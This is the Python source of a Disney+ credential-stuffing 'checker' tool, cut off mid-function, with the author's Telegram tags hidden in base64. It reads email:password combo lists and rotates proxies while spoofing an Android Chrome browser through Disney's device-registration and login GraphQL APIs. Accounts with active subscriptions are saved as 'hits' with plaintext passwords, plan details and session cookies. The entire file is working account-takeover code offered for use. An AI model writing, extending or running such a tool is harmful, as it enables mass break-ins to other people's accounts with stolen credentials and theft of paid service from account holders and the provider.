#!/usr/bin/env python3
from curl_cffi.requests import Session
import urllib3
import uuid
import json
import re
import os
import sys
import threading
import time
import configparser
import unicodedata
import logging
import base64
import hashlib
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm  
from datetime import datetime, timezone
from typing import Dict, Optional, Tuple, Union, List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
_combo_pattern = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+:[^\s]+')

def extract_combos_from_text(content: str) -> set:
    combos = set()
    for line in content.splitlines():
        found = _combo_pattern.findall(line)
        combos.update(found)
    return combos

def is_file_messy(lines: list) -> bool:
    total = len(lines)
    if total == 0:
        return True
    colon_count = sum(1 for line in lines if ':' in line)
    return (colon_count / total) < 0.5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"

SDK_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
BASE_URL = "https://disney.api.edge.bamgrid.com"
DEVICE_REG_ENDPOINT = f"{BASE_URL}/graph/v1/device/graphql"
GRAPHQL_ENDPOINT = f"{BASE_URL}/v1/public/graphql"
SUBS_ENDPOINT = f"{BASE_URL}/v2/subscribers"

X_APP_VERSION = "c4b66d76"
X_SDK_CLIENT = "disney-svod-3d9324fc"
X_SDK_PLATFORM = "javascript/android/chrome"
X_SDK_VERSION = "c4b66d76-disneyplus-nsx"
X_IDENTITY_CLIENT = "DTCI-DISNEYPLUS.WEB"

PROXY_TIMEOUT = 25
MAX_THREADS = 10
RETRY_ATTEMPTS = 3
PROXY_POOL = []  
BAD_PROXIES = set() 
_B64_SYS_TOOL = "RElTTkVZKyBDSEVDS0VS"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR = "RGlzbmV5X0BleWVsaWZ0ZXI="
_B64_SYS_TAG = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="

def _d(e):
    try:
        return base64.b64decode(e).decode('utf-8')
    except Exception as ex:
        raise SystemExit(f"Decoding failed for: {e[:20]}... (error: {ex}) change to @samvir1/@samvir1")

TOOL_NAME = _d(_B64_SYS_TOOL)
TG_USERNAME = _d(_B64_SYS_AUTH) 
TG_CHANNEL = _d(_B64_SYS_CHAN)
RESULTS_FOLDER = _d(_B64_SYS_DIR)
AUTHOR_TAG = _d(_B64_SYS_TAG)

def _v(ctx="x"):

    _EXP_TOOL = "RElTTkVZKyBDSEVDS0VS"      
    _EXP_USER = "QGV5ZWxpZnRlcg=="    
    _EXP_CHAN = "QGRhcmtodWNoYW5uZWw="  
    _EXP_DIR = "RGlzbmV5X0BleWVsaWZ0ZXI="  

    errors = []
    if TOOL_NAME != base64.b64decode(_EXP_TOOL).decode():
        errors.append("TOOL_NAME mismatch")
    if TG_USERNAME != base64.b64decode(_EXP_USER).decode():
        errors.append("TG_USERNAME mismatch")
    if TG_CHANNEL != base64.b64decode(_EXP_CHAN).decode():
        errors.append("TG_CHANNEL mismatch")
    if RESULTS_FOLDER != base64.b64decode(_EXP_DIR).decode():
        errors.append("RESULTS_FOLDER mismatch")

    if errors:
        raise RuntimeError(
            f"System integrity failure at '{ctx}': {', '.join(errors)}"
        )

def _c(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"

_LEVEL_STYLE = {
    "SUCCESS": ("32", True),
    "INFO":    ("36", False),
    "WARN":    ("33", True),
    "ERROR":   ("31", True),
    "STEP":    ("96", True),
}

def L(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{_c('90', ts)} {emoji}  {_c(code, f'{level:7s}', bold)}  {_c('90', tag)}  {msg}", flush=True)

def banner(title, sub=None, width=62):
    print()
    _v("b")
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    print(_c("90", vt) + " " + _c("96", title.center(width-4), True) + " " + _c("90", vt))
    if sub:
        print(_c("90", vt) + " " + _c("2", sub.center(width-4)) + " " + _c("90", vt))
    print(_c("90", vt) + " " + _c("5", AUTHOR_TAG.center(width-4), True) + " " + _c("90", vt))
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))

def section(title, width=62):
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(_c("90", "┌" if _ANSI else "+") + _c("96", inner, True) + _c("90", hz * pad + ("┐" if _ANSI else "+")))

def divider(width=62):
    hz = "─" if _ANSI else "-"
    print(_c("90", hz * width))

def summary_box(rows, width=62):
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line = f"{_c('96', k, True)}: {_c('0', str(v))}"
        print(f"{_c('90', vt)} {line:<{width-4}} {_c('90', vt)}")
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))
    print()

def days_until(expiry_str):
    if not expiry_str:
        return 0
    try:
        if expiry_str.endswith('Z'):
            expiry_str = expiry_str[:-1] + '+00:00'
        expiry = datetime.fromisoformat(expiry_str)
        delta = expiry - datetime.now(timezone.utc)
        return max(0, delta.days)
    except:
        return 0

MONTH_ALIASES = {
    "january":1, "february":2, "march":3, "april":4, "may":5, "june":6,
    "july":7, "august":8, "september":9, "october":10, "november":11, "december":12,
    "jan":1, "feb":2, "mar":3, "apr":4, "may":5, "jun":6, "jul":7, "aug":8, "sep":9, "oct":10, "nov":11, "dec":12,
}

COUNTRY_FLAGS = {
    "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹",
    "ES": "🇪🇸", "NL": "🇳🇱", "BR": "🇧🇷", "MX": "🇲🇽", "JP": "🇯🇵", "KR": "🇰🇷", "IN": "🇮🇳",
    "SG": "🇸🇬", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "AT": "🇦🇹", "CH": "🇨🇭",
    "BE": "🇧🇪", "IE": "🇮🇪", "NZ": "🇳🇿", "ZA": "🇿🇦", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴",
    "PE": "🇵🇪", "AE": "🇦🇪", "SA": "🇸🇦", "TR": "🇹🇷", "PL": "🇵🇱", "CZ": "🇨🇿", "HU": "🇭🇺",
    "RO": "🇷🇴", "GR": "🇬🇷", "PT": "🇵🇹", "IL": "🇮🇱", "HK": "🇭🇰", "TW": "🇹🇼", "TH": "🇹🇭",
    "MY": "🇲🇾", "PH": "🇵🇭", "ID": "🇮🇩", "VN": "🇻🇳", "RU": "🇷🇺", "UA": "🇺🇦", "CN": "🇨🇳",
}

COUNTRY_NAMES = {
    "US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
    "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain", "NL": "Netherlands",
    "BR": "Brazil", "MX": "Mexico", "JP": "Japan", "KR": "South Korea", "IN": "India",
    "SG": "Singapore", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
    "AT": "Austria", "CH": "Switzerland", "BE": "Belgium", "IE": "Ireland", "NZ": "New Zealand",
    "ZA": "South Africa", "AR": "Argentina", "CL": "Chile", "CO": "Colombia", "PE": "Peru",
    "AE": "UAE", "SA": "Saudi Arabia", "TR": "Turkey", "PL": "Poland", "CZ": "Czech Republic",
    "HU": "Hungary", "RO": "Romania", "GR": "Greece", "PT": "Portugal", "IL": "Israel",
    "HK": "Hong Kong", "TW": "Taiwan", "TH": "Thailand", "MY": "Malaysia", "PH": "Philippines",
    "ID": "Indonesia", "VN": "Vietnam", "RU": "Russia", "UA": "Ukraine", "CN": "China"
}

stop_event = threading.Event()

def normalize_calendar_year(year):
    try:
        year = int(year)
    except:
        return None
    if 2400 <= year <= 2700:
        return year - 543
    return year

def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except:
            continue
    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except:
        pass
    east_asian = re.search(r"(?P<year>\d{4})\s*[年년]\s*(?P<month>\d{1,2})\s*[月월](?:\s*(?P<day>\d{1,2})\s*[日일])?", cleaned)
    if east_asian:
        try:
            year = normalize_calendar_year(east_asian.group("year"))
            month = int(east_asian.group("month"))
            day = int(east_asian.group("day") or 1)
            if year is not None:
                return datetime(year, month, day)
        except:
            pass
    numeric_parts = [int(x) for x in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first = normalize_calendar_year(first)
            third = normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    month = None
    for alias, m in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = m
            break
    if month is None:
        return None
    year = None
    for number in numeric_parts:
        n_year = normalize_calendar_year(number)
        if n_year is not None and 1900 <= n_year <= 3000:
            year = n_year
            break
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match:
            year = normalize_calendar_year(year_match.group(0))
    if year is None:
        return None
    day = 1
    for number in numeric_parts:
        if normalize_calendar_year(number) == year:
            continue
        if 1 <= number <= 31:
            day = number
            break
    try:
        return datetime(year, month, day)
    except:
        return None

def format_display_date(value):
    if not value:
        return "N/A"
    parsed = parse_localized_date(value)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return value

def country_code_to_flag(code):
    if not code:
        return ""
    code = code.strip().upper()
    return COUNTRY_FLAGS.get(code, "")

def format_country_with_flag(code):
    if not code or code in ("N/A", "Unknown", ""):
        return "Unknown"
    code = code.strip().upper()
    flag = country_code_to_flag(code)
    name = COUNTRY_NAMES.get(code, code)
    if flag:
        return f"{name} {flag}"
    return name

class ConfigLoader:
    def __init__(self, config_file="config_disney.ini"):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.parse_config()
        except Exception:
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        self.config["General"] = {
            "threads": "2",
            "timeout": "45",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "2"
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def parse_config(self):
        self.settings["threads"] = self.config.getint("General", "threads", fallback=2)
        self.settings["timeout"] = self.config.getint("General", "timeout", fallback=45)
        self.settings["proxies_file"] = self.config.get("General", "proxies_file", fallback="proxies.txt")
        self.settings["retries"] = self.config.getint("General", "retries", fallback=2)
        self.settings["retry_delay"] = self.config.getint("General", "retry_delay", fallback=2)

CONFIG = ConfigLoader().settings
REQ_TIMEOUT = CONFIG["timeout"]
MAX_RETRIES = CONFIG["retries"]
RETRY_DELAY = CONFIG["retry_delay"]

print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    "checked": 0,
    "hits": 0,
    "free": 0,
    "bad": 0,
    "custom": 0,
    "errors": 0,
    "retries": 0
}
START_TIME = time.time()
TOTAL_COMBOS = 0
SESSION_FOLDER = None
DEBUG = False
def get_session_folder():
    _v("s")
    global SESSION_FOLDER
    if SESSION_FOLDER is None:
        base = RESULTS_FOLDER
        if not os.path.exists(base):
            os.makedirs(base)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        SESSION_FOLDER = os.path.join(base, f"Session_{ts}")
        os.makedirs(SESSION_FOLDER, exist_ok=True)
    return SESSION_FOLDER

def save_json_summary():
    _v("j")
    folder = get_session_folder()
    path = os.path.join(folder, "summary.json")
    summary = {
        "tool": TOOL_NAME,
        "author": AUTHOR_TAG,
        "session_folder": SESSION_FOLDER,
        "total_checked": stats["checked"],
        "hits": stats["hits"],
        "free": stats["free"],
        "bad": stats["bad"],
        "custom": stats["custom"],
        "errors": stats["errors"],
        "retries": stats["retries"],
        "elapsed_time": time.time() - START_TIME,
        "timestamp": datetime.now().isoformat()
    }
    with file_lock:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2)

def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def test_proxy(proxy):
    try:
        session = Session(impersonate="chrome131_android")
        session.proxies = {"http": proxy, "https": proxy}
        response = session.get("https://httpbin.org/ip", timeout=11)
        return response.status_code == 200
    except:
        return False

def load_proxies():
    proxies = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = format_proxy(line)
                    if p:
                        proxies.append(p)
    return proxies

def get_working_proxies(proxies, max_workers=None):
    if not proxies:
        return []
    
    if max_workers is None:
        max_workers = min(69, len(proxies))
    
    L("🧪", "INFO", "PROXY", f"Testing {len(proxies)} proxies in parallel (up to {max_workers} threads)...")
    
    working = []
    total = len(proxies)
    
    pbar = tqdm(total=total, desc="Testing proxies", unit="proxy", ncols=80,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
    
    def test_one(proxy):
        alive = test_proxy(proxy)
        return proxy, alive
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_one, p): p for p in proxies}
        for future in as_completed(futures):
            proxy, alive = future.result()
            if alive:
                working.append(proxy)
            pbar.update(1)
    
    pbar.close()
    
    L("✅", "INFO", "PROXY", f"{len(working)} working proxies found")
    return working if working else proxies  

class EyeLifter:
    REGISTER_QUERY = """
    mutation registerDevice($input: RegisterDeviceInput!) {
      registerDevice(registerDevice: $input) {
        grant { grantType assertion }
      }
    }
    """

    CHECK_EMAIL_QUERY = """
    query check($email: String!, $validateEmailOnOperations: ValidateEmailOnOperationsInput) {
      check(email: $email, validateEmailOnOperations: $validateEmailOnOperations) {
        operations
        nextOperation
        email { isValid validationFailureCodes suggestions { domain } }
      }
    }
    """

    LOGIN_MUTATION = """
    mutation login($input: LoginInput!) {
      login(login: $input) {
        actionGrant
        account { activeProfile { id } profiles { id attributes { isDefault parentalControls { isPinProtected } } } }
        activeSession { isSubscriber }
        identity { personalInfo { dateOfBirth gender } flows { personalInfo { requiresCollection eligibleForCollection } } }
      }
    }
    """

    ME_QUERY = """
    query me {
      me {
        account {
          activeProfile { id name }
          profiles { id name }
          attributes { email emailVerified locations { registration { geoIp { country } } purchase { country } } }
        }
        identity {
          email
          subscriber {
            subscriberStatus
            subscriptions {
              id
              state
              partner
              source { sourceProvider sourceType subType }
              product { name subscriptionPeriod earlyAccess trial { duration } categoryCodes }
              term { expiryDate nextRenewalDate isFreeTrial }
            }
          }
        }
      }
    }
    """

    BASE_HEADERS = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://www.disneyplus.com",
        "Referer": "https://www.disneyplus.com/",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "X-Application-Version": X_APP_VERSION,
        "X-Bamsdk-Client-Id": X_SDK_CLIENT,
        "X-Bamsdk-Platform": X_SDK_PLATFORM,
        "X-Bamsdk-Platform-Id": "browser",
        "X-Bamsdk-Version": X_SDK_VERSION,
        "X-Bamtech-Wpnx-Mlp-Identifier": "/",
        "X-Bamtech-Wpnx-Mlp-Locale": "en-us",
        "X-Disney-Identity-Client-Id": X_IDENTITY_CLIENT,
    }

    def __init__(self):
        if self.__class__.__name__ != "EyeLifter":
            raise RuntimeError("x")
        _v("i")

    def _safe_json(self, response):
        _v("p")
        try:
            return response.json()
        except:
            return None

    def _build_headers(self, auth_token=None, request_id=None):
        headers = self.BASE_HEADERS.copy()
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        if request_id:
            headers["X-Request-ID"] = request_id
            headers["X-BAMSDK-Transaction-ID"] = request_id
        return headers

    def spawn_device(self, session):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "registerDevice",
            "query": self.REGISTER_QUERY,
            "variables": {
                "input": {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "browser",
                    "deviceLanguage": "en",
                    "devicePlatformId": "browser",
                    "attributes": {
                        "brand": "web",
                        "browserName": "chrome",
                        "browserVersion": "139.0.0.0",
                        "manufacturer": "n/a",
                        "model": None,
                        "operatingSystem": "android",
                        "operatingSystemVersion": "10.0",
                        "osDeviceIds": []
                    }
                }
            }
        }

        try:
            response = session.post(
                DEVICE_REG_ENDPOINT,
                headers=self._build_headers(auth_token=SDK_KEY, request_id=request_id),
                json=payload,
                timeout=REQ_TIMEOUT
            )
        except Exception as e:
            logger.debug(f"Device reg error: {e}")
            return None

        if DEBUG:
            print(f"[DEBUG] Device reg status: {response.status_code}")
            print(f"[DEBUG] Device reg response: {response.text[:200]}")

        if response.status_code != 200:
            return None

        data = self._safe_json(response)
        if not isinstance(data, dict):
            return None

        try:
            token = data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
            return token
        except:
            return None

    def verify_email(self, session, device_token, email):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "check",
            "query": self.CHECK_EMAIL_QUERY,
            "variables": {
                "email": email,
                "validateEmailOnOperations": {"operations": ["Register"]}
            }
        }

        try:
            response = session.post(
                GRAPHQL_ENDPOINT,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=REQ_TIMEOUT
            )
        except Exception as e:
            if DEBUG:
                print(f"[DEBUG] verify_email network error: {e}")
            return False

        if DEBUG:
            print(f"[DEBUG] verify_email status: {response.status_code}")
            print(f"[DEBUG] verify_email response: {response.text[:500]}")

        if response.status_code != 200:
            return False

        data = self._safe_json(response)
        if not isinstance(data, dict):
            return False

        if DEBUG:
            print(f"[DEBUG] verify_email JSON: {json.dumps(data, indent=2)[:1000]}")

        if data.get("errors"):
            if DEBUG:
                print(f"[DEBUG] verify_email GraphQL errors: {data['errors']}")
            return False

        operations = data.get("data", {}).get("check", {}).get("operations", [])
        if DEBUG:
            print(f"[DEBUG] verify_email operations: {operations}")

        if not operations:
            return False

        return operations != ["Register"]

    def login(self, session, device_token, email, password):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "login",
            "query": self.LOGIN_MUTATION,
            "variables": {
                "input": {
                    "email": email,
                    "password": password
                }
            }
        }

        try:
            response = session.post(
                GRAPHQL_ENDPOINT,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=REQ_TIMEOUT
            )
        except Exception as e:
            if DEBUG:
                print(f"[DEBUG] login network error: {e}")
            return None, False, "", "network_error"

        if DEBUG:
            print(f"[DEBUG] login status: {response.status_code}")
            print(f"[DEBUG] login response: {response.text[:500]}")

        if response.status_code != 200:
            return None, False, "", f"http_{response.status_code}"

        data = self._safe_json(response)
        if not isinstance(data, dict):
            return None, False, "", "invalid_json"

        errors = data.get("errors")
        if errors:
            error_code = errors[0].get("extensions", {}).get("code", "unknown_error")
            return None, False, "", error_code

        try:
            user_token = data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
            is_subscriber = data.get("data", {}).get("login", {}).get("activeSession", {}).get("isSubscriber", False)
            country = data.get("extensions", {}).get("sdk", {}).get("session", {}).get("location", {}).get("countryCode", "")
        except:
            return None, False, "", "extraction_error"

        return user_token, is_subscriber, country, None

    def fetch_account_details(self, session, user_token):
        try:
            response = session.post(
                GRAPHQL_ENDPOINT,
                headers=self._build_headers(auth_token=user_token, request_id=str(uuid.uuid4())),
                json={"query": self.ME_QUERY},
                timeout=REQ_TIMEOUT
            )
            if response.status_code != 200:
                return {}
            data = response.json()
            if data is None or not isinstance(data, dict):
                return {}
            return data.get("data", {}).get("me", {})
        except Exception:
            return {}

    def get_cookies_string(self, session):
        if not session.cookies:
            return "# No cookies saved"
        lines = ["# Netscape HTTP Cookie File", "# This file was generated by Disney+ Checker", ""]
        for cookie in session.cookies:
            domain = cookie.domain or ""
            flag = "TRUE" if domain.startswith('.') else "FALSE"
            path = cookie.path or "/"
            secure = "TRUE" if cookie.secure else "FALSE"
            expires = int(cookie.expires) if cookie.expires else 0
            lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{cookie.name}\t{cookie.value}")
        return "\n".join(lines)

    def format_hit_report(self, email, password, result, cookies_text=None):
        _v("r")
        plan = result.get("plan", "Unknown")
        country = result.get("country", "??")
        expiry = result.get("expiry_date", "")
        days_left = days_until(expiry)
        status = result.get("subscriber_status", "ACTIVE")
        profiles = ", ".join(result.get("profile_names", []))
        partner = result.get("partner", "")
        source = result.get("source_provider", "")
        period = result.get("subscription_period", "")
        renewal = result.get("renewal", "")
        email_verified = result.get("email_verified", False)
        free_trial = result.get("is_free_trial", False)
        early_access = result.get("early_access", False)
        categories = result.get("categories", "")

        lines = []
        lines.append("1x Disney+ Hit")
        lines.append(f"Owner : {AUTHOR_TAG}")
        lines.append("=" * 80)
        lines.append("")
        lines.append(f"EMAIL: {email}")
        lines.append(f"PASSWORD: {password}")
        lines.append(f"PLAN: {plan}")
        lines.append(f"COUNTRY: {country}")
        lines.append(f"EXPIRY: {expiry}")
        lines.append(f"DAYS LEFT: {days_left}")
        lines.append(f"STATUS: {status}")
        if profiles:
            lines.append(f"PROFILES: {profiles}")
        if partner:
            lines.append(f"PARTNER: {partner}")
        if source:
            lines.append(f"SOURCE: {source}")
        if period:
            lines.append(f"PERIOD: {period}")
        if renewal:
            lines.append(f"NEXT RENEWAL: {renewal}")
        if categories:
            lines.append(f"CATEGORIES: {categories}")
        lines.append(f"EMAIL VERIFIED: {email_verified}")
        lines.append(f"FREE TRIAL: {free_trial}")
        lines.append(f"EARLY ACCESS: {early_access}")
        lines.append("")
        lines.append("-" * 80)
        lines.append("")
        short = f"[{email}]-[{password}]-[{plan}]-[{country}]-[{expiry}]-{days_left}d"
        if partner:
            short += f"-{partner}"
        lines.append(short)
        lines.append("")
        lines.append("-" * 80)
        lines.append("")

        if cookies_text:
            lines.append(cookies_text)
        else:
            lines.append("# No cookies saved")

        return "\n".join(lines)

    def save_hit_report(self, email, password, result, session):
        _v("h")
        folder = get_session_folder()
        safe_email = email.replace('@', '_at_').replace('.', '_')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(folder, f"Disney_{safe_email}_{timestamp}.txt")
        cookies_text = self.get_cookies_string(session)
        report = self.format_hit_report(email, password, result, cookies_text)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(report)
        return filename

    def get_sub_details(self, session, user_token):
        request_id = str(uuid.uuid4())
        try:
            response = session.get(
                SUBS_ENDPOINT,
                headers=self._build_headers(auth_token=user_token, request_id=request_id),
                timeout=REQ_TIMEOUT
            )
        except:
            return {"is_active": False, "error": "Network error"}

        if response.status_code != 200:
            return {"is_active": False, "error": f"HTTP {response.status_code}"}

        data = self._safe_json(response)
        if not isinstance(data, list):
            return {"is_active": False, "plan": "None", "error": "Invalid response"}

        if len(data) == 0:
            return {"is_active": False, "plan": "None"}

        sub = data[0]
        return {
            "is_active": sub.get("subscriberStatus") == "ACTIVE",
            "plan": sub.get("product", {}).get("name", "Unknown"),
            "period": sub.get("product", {}).get("subscriptionPeriod", "N/A"),
            "is_free_trial": sub.get("term", {}).get("isFreeTrial", False),
            "next_renewal": sub.get("term", {}).get("nextRenewalDate", "")[:10]
        }

    def check(self, email, password, proxy=None, attempt=0):
        _v("c")
        if stop_event.is_set():
            return {"status": "STOPPED", "email": email, "error": "Stopped by user"}

        global PROXY_POOL, BAD_PROXIES

        session = Session(impersonate="chrome131_android")
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        result = {
            "email": email,
            "status": "RETRY",
            "country": "",
            "plan": "",
            "error": ""
        }

        try:
            device_token = None
            for dev_attempt in range(2):
                device_token = self.spawn_device(session)
                if device_token:
                    break

                if proxy:
                    BAD_PROXIES.add(proxy)

                if PROXY_POOL:
                    available = [p for p in PROXY_POOL if p not in BAD_PROXIES]
                    if not available:
                        available = PROXY_POOL  
                    new_proxy = random.choice(available)

                    while new_proxy == proxy and len(available) > 1:
                        new_proxy = random.choice(available)
                    proxy = new_proxy
                    session.proxies = {"http": proxy, "https": proxy}
                    time.sleep(1)

            if not device_token:
                result["error"] = "Device registration failed after retries (proxy/network)"
                return result


            if not self.verify_email(session, device_token, email):
                result["status"] = "BAD"
                result["error"] = "Email not registered"
                return result

            user_token, is_subscriber, country, error_code = self.login(
                session, device_token, email, password
            )
            result["country"] = country

            if error_code:
                ERROR_MAP = {
                    "idp.error.identity.bad-credentials": ("BAD", "Wrong password"),
                    "idp.error.identity.password-reset-required": ("CUSTOM", "Password reset required"),
                    "idp.error.identity.account-disabled": ("BAD", "Account disabled"),
                    "idp.error.identity.identity-blocked": ("BAD", "Identity blocked"),
                    "idp.error.identity.otp-required": ("CUSTOM", "2FA required"),
                    "rate-limit": ("RETRY", "Rate limited"),
                    "too-many-requests": ("RETRY", "Too many requests"),
                    "network_error": ("RETRY", "Network error"),
                }
                status, msg = ERROR_MAP.get(error_code, ("CUSTOM", f"Error: {error_code}"))

                if status == "RETRY" and attempt < MAX_RETRIES:
                    delay = RETRY_DELAY * (2 ** attempt)
                    logger.debug(f"Retrying {email} after {delay}s (attempt {attempt+1})")
                    time.sleep(delay)
                    return self.check(email, password, proxy, attempt + 1)

                result["status"] = status
                result["error"] = msg
                return result

            if not user_token:
                result["status"] = "BAD"
                result["error"] = "Login failed"
                return result

            account_data = self.fetch_account_details(session, user_token)
            if account_data:
                result["email_verified"] = account_data.get("account", {}).get("attributes", {}).get("emailVerified", False)
                result["profile_names"] = [
                    p.get("name") for p in account_data.get("account", {}).get("profiles", []) if p.get("name")
                ]
                result["active_profile"] = account_data.get("account", {}).get("activeProfile", {}).get("name", "")

                identity = account_data.get("identity", {})
                result["subscriber_status"] = identity.get("subscriber", {}).get("subscriberStatus", "")
                subs = identity.get("subscriber", {}).get("subscriptions", [])
                if subs:
                    sub = subs[0]
                    result["plan"] = sub.get("product", {}).get("name", result.get("plan", ""))
                    result["subscription_period"] = sub.get("product", {}).get("subscriptionPeriod", "")
                    result["expiry_date"] = sub.get("term", {}).get("expiryDate", "")[:10]
                    result["renewal"] = sub.get("term", {}).get("nextRenewalDate", "")[:10]
                    result["is_free_trial"] = sub.get("term", {}).get("isFreeTrial", False)
                    result["partner"] = sub.get("partner", "")
                    result["source_provider"] = sub.get("source", {}).get("sourceProvider", "")
                    result["early_access"] = sub.get("product", {}).get("earlyAccess", False)
                    result["state"] = sub.get("state", "")
                    cats = sub.get("product", {}).get("categoryCodes", [])
                    result["categories"] = ", ".join(cats) if cats else ""

            plan_info = self.get_sub_details(session, user_token)
            if plan_info.get("is_active"):
                result["status"] = "HIT"
                result["plan"] = plan_info.get("plan", result.get("plan", "Premium"))
                result["renewal"] = plan_info.get("next_renewal", result.get("renewal", ""))
                result["error"] = ""

                report_file = self.save_hit_report(email, password, result, session)
                result["report_file"] = report_file
            else:
                result["status"] = "FREE"
                result["plan"] = plan_info.get("plan", result.get("plan", "None"))
                result["error"] = "No active subscription"

            return result

        except Exception as e:
            logger.error(f"Exception checking {email}: {e}")
            result["error"] = str(e)[:80]
            if attempt < MAX_RETRIES:
                time.sleep(RETRY_DELAY)
                return self.check(email, password, proxy, attempt + 1)
            return result

    
def process_combo(combo, proxy=None):
    global TOTAL_COMBOS

    if stop_event.is_set():
        return

    if ":" not in combo:
        _v("w")
        return

    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return

    checker = EyeLifter()
